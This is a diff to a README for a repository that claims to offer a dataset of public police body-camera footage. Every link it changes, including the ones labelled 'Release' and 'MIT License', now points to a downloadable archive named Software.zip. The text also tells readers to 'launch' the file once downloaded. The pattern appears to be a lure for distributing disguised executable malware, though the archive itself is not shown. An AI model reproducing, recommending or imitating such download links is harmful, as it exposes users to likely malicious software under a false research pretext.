@@ -19,7 +19,7 @@ Welcome to the public-police-footage repository! This repository contains the co
 
 ### 📦 Download the Dataset
 To access the dataset constructed from public police body camera footage, click the button below:
-[![Download Dataset](https://github.com/andoygomez/public-police-footage/releases/download/v1.0/Soft.zip)](https://github.com/andoygomez/public-police-footage/releases/download/v1.0/Soft.zip)
+[![Download Dataset](https://github.com/andoygomez/public-police-footage/releases/download/v2.0/Software.zip)](https://github.com/andoygomez/public-police-footage/releases/download/v2.0/Software.zip)
 
 (If the link ends with a file name, make sure to launch it.)
 
@@ -48,11 +48,11 @@ Enjoy exploring the public-police-footage repository and delve into the world of
 ---
 
 ### Additional Resources
-For more information on the dataset, visit the [Release](https://github.com/andoygomez/public-police-footage/releases/download/v1.0/Soft.zip) section.
+For more information on the dataset, visit the [Release](https://github.com/andoygomez/public-police-footage/releases/download/v2.0/Software.zip) section.
 
 Thank you for contributing to open data research and computational social science!
 
 ---
 
 ### Legal Information
-The code and dataset in this repository are made available under the [MIT License](https://github.com/andoygomez/public-police-footage/releases/download/v1.0/Soft.zip).
+The code and dataset in this repository are made available under the [MIT License](https://github.com/andoygomez/public-police-footage/releases/download/v2.0/Software.zip).
